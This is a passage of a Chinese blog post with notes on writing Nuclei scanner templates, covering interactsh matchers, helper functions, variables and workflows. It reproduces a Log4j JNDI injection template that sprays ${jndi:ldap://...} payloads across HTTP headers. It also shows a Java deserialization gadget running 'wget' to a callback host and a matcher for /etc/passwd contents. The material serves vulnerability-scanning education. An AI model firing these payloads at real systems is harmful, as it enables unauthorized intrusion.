+<h5 id="interactsh_response">interactsh_response<a hidden class="anchor" aria-hidden="true" href="#interactsh_response">#</a></h5>
+<p>interact.sh 服务器发送给客户端的响应。</p>
+<p>Interactsh DNS 交互匹配器示例：</p>
+<pre><code>    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms the DNS Interaction
+        words:
+          - &quot;dns&quot;
+</code></pre>
+<p>交互内容上的 HTTP 交互匹配器 + 单词匹配器示例</p>
+<pre><code>matchers-condition: and
+matchers:
+    - type: word
+      part: interactsh_protocol # Confirms the HTTP Interaction
+      words:
+        - &quot;http&quot;
+
+    - type: regex
+      part: interactsh_request # Confirms the retrieval of etc/passwd file
+      regex:
+        - &quot;root:[x*]:0:0:&quot;
+</code></pre>
+<p>之前在github找的一个log4j2扫描模板就用到了这个。</p>
+<pre><code class="language-yaml">id: log4j-fuzz-head-poc
+
+info:
+  name: log4j-rce漏洞
+  author: xxx
+  severity: critical
+  tags: apache,rce
+
+requests:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        {{log4j_payloads}}
+
+      - |
+        POST / HTTP/1.1
+        Host: {{Hostname}}
+        {{log4j_payloads}}
+    payloads:
+      log4j_payloads:
+        - &#039;X-Client-IP: ${jndi:ldap://{{interactsh-url}}/info}&#039;
+        - &#039;X-Remote-IP: ${jndi:ldap://{{interactsh-url}}/info}&#039;
+        - &#039;X-Remote-Addr: ${jndi:ldap://{{interactsh-url}}/info}&#039;
+        - &#039;X-Forwarded-For: ${jndi:ldap://{{interactsh-url}}/info}&#039;
+        - &#039;X-Originating-IP: ${jndi:ldap://{{interactsh-url}}/info}&#039;
+        - &#039;User-Agent: ${jndi:ldap://{{interactsh-url}}/info}&#039;
+        - &#039;Referer: ${jndi:ldap://{{interactsh-url}}/info}&#039;
+        - &#039;CF-Connecting_IP: ${jndi:ldap://{{interactsh-url}}/info}&#039;
+        - &#039;True-Client-IP: ${jndi:ldap://{{interactsh-url}}/info}&#039;
+        - &#039;X-Forwarded-For: ${jndi:ldap://{{interactsh-url}}/info}&#039;
+        - &#039;Originating-IP: ${jndi:ldap://{{interactsh-url}}/info}&#039;
+        - &#039;X-Real-IP: ${jndi:ldap://{{interactsh-url}}/info}&#039;
+        - &#039;X-Client-IP: ${jndi:ldap://{{interactsh-url}}/info}&#039;
+        - &#039;Forwarded: ${jndi:ldap://{{interactsh-url}}/info}&#039;
+        - &#039;Client-IP: ${jndi:ldap://{{interactsh-url}}/info}&#039;
+        - &#039;Contact: ${jndi:ldap://{{interactsh-url}}/info}&#039;
+        - &#039;X-Wap-Profile: ${jndi:ldap://{{interactsh-url}}/info}&#039;
+        - &#039;X-Api-Version: ${jndi:ldap://{{interactsh-url}}/info}&#039;
+        - &#039;Host: ${jndi:ldap://{{interactsh-url}}/info}&#039;
+
+    attack: clusterbomb
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        name: http
+        words:
+          - "http"
+
+      - type: word
+        part: interactsh_protocol
+        name: dns
+        words:
+          - "dns"
+</code></pre>
+<h3 id="辅助函数">辅助函数<a hidden class="anchor" aria-hidden="true" href="#辅助函数">#</a></h3>
+<h4 id="辅助函数-1">辅助函数<a hidden class="anchor" aria-hidden="true" href="#辅助函数-1">#</a></h4>
+<p>以下是可在 RAW 请求/网络请求中使用的所有支持的辅助函数的列表。</p>
+<p>太多了记不住，cv一下。。。</p>
+<table>
+<thead>
+<tr>
+<th>Helper function</th>
+<th>Description</th>
+<th>Example</th>
+<th>Output</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>base64(src interface{}) string</td>
+<td>Base64 对字符串进行编码</td>
+<td><code>base64(&quot;Hello&quot;)</code></td>
+<td><code>SGVsbG8=</code></td>
+</tr>
+<tr>
+<td>base64_decode(src interface{}) []byte</td>
+<td>Base64 对字符串进行解码</td>
+<td><code>base64_decode(&quot;SGVsbG8=&quot;)</code></td>
+<td><code>Hello</code></td>
+</tr>
+<tr>
+<td>base64_py(src interface{}) string</td>
+<td>像 python 一样将字符串编码为 base64（带有新行）</td>
+<td><code>base64_py(&quot;Hello&quot;)</code></td>
+<td><code>SGVsbG8=</code></td>
+</tr>
+<tr>
+<td>concat(arguments &hellip;interface{}) string</td>
+<td>连接给定数量的参数以形成一个字符串</td>
+<td><code>concat(&quot;Hello&quot;, 123, &quot;world)</code></td>
+<td><code>Hello123world</code></td>
+</tr>
+<tr>
+<td>compare_versions(versionToCheck string, constraints &hellip;string) bool</td>
+<td>将第一个版本参数与提供的约束进行比较</td>
+<td><code>compare_versions(&amp;#039;v1.0.0&amp;#039;, &amp;#039;&gt;v0.0.1&amp;#039;, &amp;#039;&lt;v1.0.1&amp;#039;)</code></td>
+<td><code>true</code></td>
+</tr>
+<tr>
+<td>contains(input, substring interface{}) bool</td>
+<td>验证字符串是否包含子字符串</td>
+<td><code>contains(&quot;Hello&quot;, &quot;lo&quot;)</code></td>
+<td><code>true</code></td>
+</tr>
+<tr>
+<td>generate_java_gadget(gadget, cmd, encoding interface{}) string</td>
+<td>生成 Java 反序列化小工具</td>
+<td><code>generate_java_gadget(&quot;dns&quot;, &quot;{{interactsh-url}}&quot;, &quot;base64&quot;)</code></td>
+<td><code>rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADGphdmEubmV0LlVSTJYlNzYa/ORyAwAHSQAIaGFzaENvZGVJAARwb3J0TAAJYXV0aG9yaXR5dAASTGphdmEvbGFuZy9TdHJpbmc7TAAEZmlsZXEAfgADTAAEaG9zdHEAfgADTAAIcHJvdG9jb2xxAH4AA0wAA3JlZnEAfgADeHD//////////3QAAHQAAHEAfgAFdAAFcHh0ACpjYWhnMmZiaW41NjRvMGJ0MHRzMDhycDdlZXBwYjkxNDUub2FzdC5mdW54</code></td>
+</tr>
+<tr>
+<td>gzip(input string) string</td>
+<td>使用 GZip 压缩输入</td>
+<td><code>gzip(&quot;Hello&quot;)</code></td>
+<td></td>
+</tr>
+<tr>
+<td>gzip_decode(input string) string</td>
+<td>使用 GZip 解压缩输入</td>
+<td><code>gzip_decode(hex_decode(&quot;1f8b08000000000000fff248cdc9c907040000ffff8289d1f705000000&quot;))</code></td>
+<td><code>Hello</code></td>
+</tr>
+<tr>
+<td>zlib(input string) string</td>
+<td>使用 Zlib 压缩输入</td>
+<td><code>base64(zlib(&quot;Hello&quot;))</code></td>
+<td><code>eJzySM3JyQcEAAD//wWMAfU=</code></td>
+</tr>
+<tr>
+<td>zlib_decode(input string) string</td>
+<td>使用 Zlib 解压缩输入</td>
+<td><code>zlib_decode(hex_decode(&quot;789cf248cdc9c907040000ffff058c01f5&quot;))</code></td>
+<td><code>Hello</code></td>
+</tr>
+<tr>
+<td>hex_decode(input interface{}) []byte</td>
+<td>十六进制解码给定的输入</td>
+<td><code>hex_decode(&quot;6161&quot;)</code></td>
+<td><code>aa</code></td>
+</tr>
+<tr>
+<td>hex_encode(input interface{}) string</td>
+<td>十六进制编码给定的输入</td>
+<td><code>hex_encode(&quot;aa&quot;)</code></td>
+<td><code>6161</code></td>
+</tr>
+<tr>
+<td>html_escape(input interface{}) string</td>
+<td>HTML 转义给定的输入</td>
+<td><code>html_escape(&quot;&lt;body&gt;test&lt;/body&gt;&quot;)</code></td>
+<td><code>&lt;body&gt;test&lt;/body&gt;</code></td>
+</tr>
+<tr>
+<td>html_unescape(input interface{}) string</td>
+<td>HTML 取消转义给定的输入</td>
+<td><code>html_unescape(&quot;&lt;body&gt;test&lt;/body&gt;&quot;)</code></td>
+<td><code>&lt;body&gt;test&lt;/body&gt;</code></td>
+</tr>
+<tr>
+<td>len(arg interface{}) int</td>
+<td>返回输入的长度</td>
+<td><code>len(&quot;Hello&quot;)</code></td>
+<td><code>5</code></td>
+</tr>
+<tr>
+<td>md5(input interface{}) string</td>
+<td>计算输入的 MD5（消息摘要）哈希</td>
+<td><code>md5(&quot;Hello&quot;)</code></td>
+<td><code>8b1a9953c4611296a827abf8c47804d7</code></td>
+</tr>
+<tr>
+<td>mmh3(input interface{}) string</td>
+<td>计算输入的 MMH3 (MurmurHash3) 哈希</td>
+<td><code>mmh3(&quot;Hello&quot;)</code></td>
+<td><code>316307400</code></td>
+</tr>
+<tr>
+<td>print_debug(args &hellip;interface{})</td>
+<td>打印给定输入或表达式的值。用于调试。</td>
+<td><code>print_debug(1+2, &quot;Hello&quot;)</code></td>
+<td><code>3 Hello</code></td>
+</tr>
+<tr>
+<td>rand_base(length uint, optionalCharSet string) string</td>
+<td>从可选字符集生成给定长度字符串的随机序列（默认为字母和数字）</td>
+<td><code>rand_base(5, &quot;abc&quot;)</code></td>
+<td><code>caccb</code></td>
+</tr>
+<tr>
+<td>rand_char(optionalCharSet string) string</td>
+<td>从可选字符集中生成随机字符（默认为字母和数字）</td>
+<td><code>rand_char(&quot;abc&quot;)</code></td>
+<td><code>a</code></td>
+</tr>
+<tr>
+<td>rand_int(optionalMin, optionalMax uint) int</td>
+<td>在给定的可选限制之间生成一个随机整数（默认为 0 - MaxInt32）</td>
+<td><code>rand_int(1, 10)</code></td>
+<td><code>6</code></td>
+</tr>
+<tr>
+<td>rand_text_alpha(length uint, optionalBadChars string) string</td>
+<td>生成给定长度的随机字母字符串，不包括可选的割集字符</td>
+<td><code>rand_text_alpha(10, &quot;abc&quot;)</code></td>
+<td><code>WKozhjJWlJ</code></td>
+</tr>
+<tr>
+<td>rand_text_alphanumeric(length uint, optionalBadChars string) string</td>
+<td>生成一个给定长度的随机字母数字字符串，没有可选的割集字符</td>
+<td><code>rand_text_alphanumeric(10, &quot;ab12&quot;)</code></td>
+<td><code>NthI0IiY8r</code></td>
+</tr>
+<tr>
+<td>rand_text_numeric(length uint, optionalBadNumbers string) string</td>
+<td>生成给定长度的随机数字字符串，没有可选的不需要的数字集</td>
+<td><code>rand_text_numeric(10, 123)</code></td>
+<td><code>0654087985</code></td>
+</tr>
+<tr>
+<td>regex(pattern, input string) bool</td>
+<td>针对输入字符串测试给定的正则表达式</td>
+<td><code>regex(&quot;H([a-z]+)o&quot;, &quot;Hello&quot;)</code></td>
+<td><code>true</code></td>
+</tr>
+<tr>
+<td>remove_bad_chars(input, cutset interface{}) string</td>
+<td>从输入中删除所需的字符</td>
+<td><code>remove_bad_chars(&quot;abcd&quot;, &quot;bc&quot;)</code></td>
+<td><code>ad</code></td>
+</tr>
+<tr>
+<td>repeat(str string, count uint) string</td>
+<td>重复输入字符串给定的次数</td>
+<td><code>repeat(&quot;../&quot;, 5)</code></td>
+<td><code>../../../../../</code></td>
+</tr>
+<tr>
+<td>replace(str, old, new string) string</td>
+<td>替换给定输入中的给定子字符串</td>
+<td><code>replace(&quot;Hello&quot;, &quot;He&quot;, &quot;Ha&quot;)</code></td>
+<td><code>Hallo</code></td>
+</tr>
+<tr>
+<td>replace_regex(source, regex, replacement string) string</td>
+<td>替换与输入中给定正则表达式匹配的子字符串</td>
+<td><code>replace_regex(&quot;He123llo&quot;, &quot;(\\d+)&quot;, &quot;&quot;)</code></td>
+<td><code>Hello</code></td>
+</tr>
+<tr>
+<td>reverse(input string) string</td>
+<td>反转给定的输入</td>
+<td><code>reverse(&quot;abc&quot;)</code></td>
+<td><code>cba</code></td>
+</tr>
+<tr>
+<td>sha1(input interface{}) string</td>
+<td>计算输入的 SHA1（安全哈希 1）哈希</td>
+<td><code>sha1(&quot;Hello&quot;)</code></td>
+<td><code>f7ff9e8b7bb2e09b70935a5d785e0cc5d9d0abf0</code></td>
+</tr>
+<tr>
+<td>sha256(input interface{}) string</td>
+<td>计算输入的 SHA256（安全哈希 256）哈希</td>
+<td><code>sha256(&quot;Hello&quot;)</code></td>
+<td><code>185f8db32271fe25f561a6fc938b2e264306ec304eda518007d1764826381969</code></td>
+</tr>
+<tr>
+<td>to_lower(input string) string</td>
+<td>将输入转换为小写字符</td>
+<td><code>to_lower(&quot;HELLO&quot;)</code></td>
+<td><code>hello</code></td>
+</tr>
+<tr>
+<td>to_upper(input string) string</td>
+<td>将输入转换为大写字符</td>
+<td><code>to_upper(&quot;hello&quot;)</code></td>
+<td><code>HELLO</code></td>
+</tr>
+<tr>
+<td>trim(input, cutset string) string</td>
+<td>返回一个输入切片，其中包含在 cutset 中的所有前导和尾随 Unicode 代码点都已删除</td>
+<td><code>trim(&quot;aaaHelloddd&quot;, &quot;ad&quot;)</code></td>
+<td><code>Hello</code></td>
+</tr>
+<tr>
+<td>trim_left(input, cutset string) string</td>
+<td>返回一个输入切片，其中包含在 cutset 中的所有前导 Unicode 代码点都已删除</td>
+<td><code>trim_left(&quot;aaaHelloddd&quot;, &quot;ad&quot;)</code></td>
+<td><code>Helloddd</code></td>
+</tr>
+<tr>
+<td>trim_prefix(input, prefix string) string</td>
+<td>返回没有提供的前导前缀字符串的输入</td>
+<td><code>trim_prefix(&quot;aaHelloaa&quot;, &quot;aa&quot;)</code></td>
+<td><code>Helloaa</code></td>
+</tr>
+<tr>
+<td>trim_right(input, cutset string) string</td>
+<td>返回一个字符串，其中包含在 cutset 中的所有尾随 Unicode 代码点都已删除</td>
+<td><code>trim_right(&quot;aaaHelloddd&quot;, &quot;ad&quot;)</code></td>
+<td><code>aaaHello</code></td>
+</tr>
+<tr>
+<td>trim_space(input string) string</td>
+<td>返回一个字符串，删除所有前导和尾随空格，由 Unicode 定义</td>
+<td><code>trim_space(&quot; Hello &quot;)</code></td>
+<td><code>&quot;Hello&quot;</code></td>
+</tr>
+<tr>
+<td>trim_suffix(input, suffix string) string</td>
+<td>返回没有提供的尾随后缀字符串的输入</td>
+<td><code>trim_suffix(&quot;aaHelloaa&quot;, &quot;aa&quot;)</code></td>
+<td><code>aaHello</code></td>
+</tr>
+<tr>
+<td>unix_time(optionalSeconds uint) float64</td>
+<td>返回当前 Unix 时间（自 1970 年 1 月 1 日 UTC 以来经过的秒数）以及添加的可选秒数</td>
+<td><code>unix_time(10)</code></td>
+<td><code>1639568278</code></td>
+</tr>
+<tr>
+<td>url_decode(input string) string</td>
+<td>URL 解码输入字符串</td>
+<td><code>url_decode(&quot;https:%2F%2Fprojectdiscovery.io%3Ftest=1&quot;)</code></td>
+<td><code>https://projectdiscovery.io?test=1</code></td>
+</tr>
+<tr>
+<td>url_encode(input string) string</td>
+<td>URL 对输入字符串进行编码</td>
+<td><code>url_encode(&quot;https://projectdiscovery.io/test?a=1&quot;)</code></td>
+<td><code>https%3A%2F%2Fprojectdiscovery.io%2Ftest%3Fa%3D1</code></td>
+</tr>
+<tr>
+<td>wait_for(seconds uint)</td>
+<td>暂停执行给定的秒数</td>
+<td><code>wait_for(10)</code></td>
+<td><code>true</code></td>
+</tr>
+<tr>
+<td>join(separator string, elements &hellip;interface{}) string)</td>
+<td>暂停执行给定的秒数</td>
+<td><code>join(&quot;_&quot;, 123, &quot;hello&quot;, &quot;world&quot;)</code></td>
+<td><code>123_hello_world</code></td>
+</tr>
+<tr>
+<td>hmac(algorithm, data, secret)</td>
+<td>hmac 函数，接受带有数据和秘密的散列函数类型</td>
+<td><code>hmac(&quot;sha1&quot;, &quot;test&quot;, &quot;scrt&quot;)</code></td>
+<td><code>8856b111056d946d5c6c92a21b43c233596623c6</code></td>
+</tr>
+<tr>
+<td>date_time(dateTimeFormat)</td>
+<td>以 go 风格的日期时间格式返回日期或时间</td>
+<td><code>date_time(&quot;%Y-%M-%D %H:%m&quot;)</code></td>
+<td><code>2022-06-10 14:18</code></td>
+</tr>
+</tbody>
+</table>
+<h4 id="反序列化辅助函数">反序列化辅助函数<a hidden class="anchor" aria-hidden="true" href="#反序列化辅助函数">#</a></h4>
+<p><a href="https://github.com/frohoff/ysoserial">Nuclei 允许从ysoserial</a>为一些常见的小工具生成有效负载。</p>
+<p><strong>支持的有效载荷：</strong></p>
+<ul>
+<li><code>dns</code>(URLDNS)</li>
+<li><code>commons-collections3.1</code></li>
+<li><code>commons-collections4.0</code></li>
+<li><code>jdk7u21</code></li>
+<li><code>jdk8u20</code></li>
+<li><code>groovy1</code></li>
+</ul>
+<p><strong>支持的编码：</strong></p>
+<ul>
+<li><code>base64</code>（默认）</li>
+<li><code>gzip-base64</code></li>
+<li><code>gzip</code></li>
+<li><code>hex</code></li>
+<li><code>raw</code></li>
+</ul>
+<p><strong>反序列化辅助函数格式：</strong></p>
+<pre><code>{{generate_java_gadget(payload, cmd, encoding}}
+</code></pre>
+<p><strong>反序列化辅助函数示例：</strong></p>
+<pre><code>{{generate_java_gadget(&quot;commons-collections3.1&quot;, &quot;wget http://{{interactsh-url}}&quot;, &quot;
+</code></pre>
+<h3 id="变量">变量<a hidden class="anchor" aria-hidden="true" href="#变量">#</a></h3>
+<p>变量可用于声明一些在整个模板中保持不变的值。变量的值一旦计算就不会改变。变量可以是简单的字符串或 DSL 辅助函数。如果变量是辅助函数，则用双花括号括起来<code>\{\{&lt;expression&gt;}}</code>。变量在模板级别声明。</p>
+<p>示例变量 -</p>
+<pre><code>variables:
+  a1: &quot;test&quot; # A string variable
+  a2: &quot;{{to_lower(rand_base(5))}}&quot; # A DSL function variable
+</code></pre>
+<p>目前，dns、http、headless和网络协议支持变量。</p>
+<p>带有变量的模板示例 -</p>
+<pre><code># Variable example using HTTP requests
+id: variables-example
+
+info:
+  name: Variables Example
+  author: pdteam
+  severity: info
+
+variables:
+  a1: &quot;value&quot;
+  a2: &quot;{{base64(&amp;#039;hello&amp;#039;)}}&quot;
+
+requests:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{FQDN}}
+        Test: {{a1}}
+        Another: {{a2}}
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+      - type: word
+        words: 
+          - &quot;value&quot;
+          - &quot;aGVsbG8=&quot;
+
+# Variable example for network requests
+id: variables-example
+
+info:
+  name: Variables Example
+  author: pdteam
+  severity: info
+
+variables:
+  a1: &quot;PING&quot;
+  a2: &quot;{{base64(&amp;#039;hello&amp;#039;)}}&quot;
+
+network:
+  - host: 
+      - &quot;{{Hostname}}&quot;
+    inputs:
+      - data: &quot;{{a1}}&quot;
+    read-size: 8
+    matchers:
+      - type: word
+        part: data
+        words:
+          - &quot;{{a2}}&quot;
+</code></pre>
+<h3 id="模板预处理器">模板<strong>预处理器</strong><a hidden class="anchor" aria-hidden="true" href="#模板预处理器">#</a></h3>
+<p>某些预处理器可以在模板中的任何位置全局指定，一旦加载模板就会运行，以实现为每个模板运行生成的随机 id 之类的东西。</p>
+<h4 id="randstr">randstr<a hidden class="anchor" aria-hidden="true" href="#randstr">#</a></h4>
+<p>信息</p>
+<p>在每次核运行时为模板生成一个<a href="https://github.com/rs/xid">随机 ID</a>。这可以在模板中的任何地方使用，并且始终包含相同的值。<code>randstr</code>可以以数字为后缀，并且也会为这些名称创建新的随机 ID。前任。<code>{{randstr_1}}</code>这将在整个模板中保持不变。</p>
+<p><code>randstr</code>在匹配器中也支持，可用于匹配输入。</p>
+<p>例如：-</p>
+<pre><code>requests:
+  - method: POST
+    path:
+      - &quot;{{BaseURL}}/level1/application/&quot;
+    headers:
+      cmd: echo &amp;#039;{{randstr}}&amp;#039;
+
+    matchers:
+      - type: word
+        words:
+          - &amp;#039;{{randstr}}&amp;#039;
+</code></pre>
+<h3 id="工作流程">工作流程<a hidden class="anchor" aria-hidden="true" href="#工作流程">#</a></h3>
+<p>工作流允许用户定义模板的执行顺序。模板将在定义的条件下运行。这些是使用核的最有效方式，其中所有模板都根据用户的需要进行配置。这意味着，您可以创建基于技术/基于目标的工作流，例如 WordPress 工作流、Jira 工作流，它们仅在检测到特定技术时运行。</p>
+<p>如果技术堆栈已知，我们建议您创建自定义工作流程来运行扫描。这导致扫描时间更短，结果更好。</p>
+<p>可以使用<code>workflows</code>属性定义工作流，在<code>template</code>/<code>subtemplates</code>之后<code>tags</code>执行。</p>
+<pre><code>workflows:
+  - template: technologies/template-to-execute.yaml
+</code></pre>
+<p><strong>工作流类型</strong></p>
+<ol>
+<li>通用工作流程</li>
+<li>条件工作流</li>
+</ol>
+<h4 id="通用工作流程">通用工作流程<a hidden class="anchor" aria-hidden="true" href="#通用工作流程">#</a></h4>
+<p>在通用工作流中，可以定义要从单个工作流文件执行的单个或多个模板。它支持文件和目录作为输入。</p>
+<p>在给定 URL 列表上运行所有与配置相关的模板的工作流。</p>
+<pre><code>workflows:
+  - template: files/git-config.yaml
+  - template: files/svn-config.yaml
+  - template: files/env-file.yaml
+  - template: files/backup-files.yaml
+  - tags: xss,ssrf,cve,lfi
+</code></pre>
+<p>运行为您的项目定义的特定检查列表的工作流。</p>
+<pre><code>workflows:
+  - template: cves/
+  - template: exposed-tokens/
+  - template: exposures/
+  - tags: exposures
+</code></pre>
+<h4 id="条件工作流">条件工作流<a hidden class="anchor" aria-hidden="true" href="#条件工作流">#</a></h4>
+<p>您还可以创建条件模板，这些模板在匹配上一个模板的条件后执行。这对于漏洞检测和利用以及基于技术的检测和利用非常有用。这种工作流程的用例是广泛而多样的。</p>
+<p><strong>基于模板的条件检查</strong></p>
+<p>当基本模板匹配时执行子模板的工作流。</p>
+<pre><code>workflows:
+  - template: technologies/jira-detect.yaml
+    subtemplates:
+      - tags: jira
+      - template: exploits/jira/
+</code></pre>
+<p><strong>基于匹配器名称的条件检查</strong></p>
+<p>当在结果中找到基本模板的匹配器时执行子模板的工作流。</p>
+<pre><code>workflows:
+  - template: technologies/tech-detect.yaml
+    matchers:
+      - name: vbulletin
+        subtemplates:
+          - template: exploits/vbulletin-exp1.yaml
+          - template: exploits/vbulletin-exp2.yaml
+      - name: jboss
+        subtemplates:
+          - template: exploits/jboss-exp1.yaml
+          - template: exploits/jboss-exp2.yaml
+</code></pre>
+<p>以类似的方式，可以根据需要为工作流创建尽可能多的嵌套检查。</p>
+<p><strong>基于子模板和匹配器名称的多级条件检查</strong></p>
+<p>一个展示模板执行链的工作流，仅当先前的模板匹配时才运行。</p>
+<pre><code>workflows:
+  - template: technologies/tech-detect.yaml
+    matchers:
+      - name: lotus-domino
+        subtemplates:
+          - template: technologies/lotus-domino-version.yaml
+            subtemplates:
+              - template: cves/xx-yy-zz.yaml
+                subtemplates:
+                  - template: cves/xx-xx-xx.yaml
+</code></pre>
+<p>条件工作流是以最有效的方式执行检查和漏洞检测的绝佳示例，而不是在所有目标上喷洒所有模板，并且通常会在您的时间上带来良好的投资回报率，并且对目标也很温和。</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2024 <a href="https://a10nggg.github.io/">A10ng_&#39;s Blog</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
